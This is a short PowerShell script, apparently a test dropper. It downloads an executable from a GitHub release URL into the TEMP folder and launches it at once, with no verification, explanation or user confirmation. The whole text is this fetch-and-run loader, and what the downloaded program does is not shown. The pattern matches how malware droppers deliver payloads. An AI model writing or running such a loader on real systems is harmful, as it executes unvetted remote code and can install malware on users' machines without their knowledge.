[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebas/estesiquesi.exe"
$destino = "$env:TEMP\estesiquesi.exe"

Invoke-WebRequest -Uri $url -OutFile $destino
Start-Process -FilePath $destino
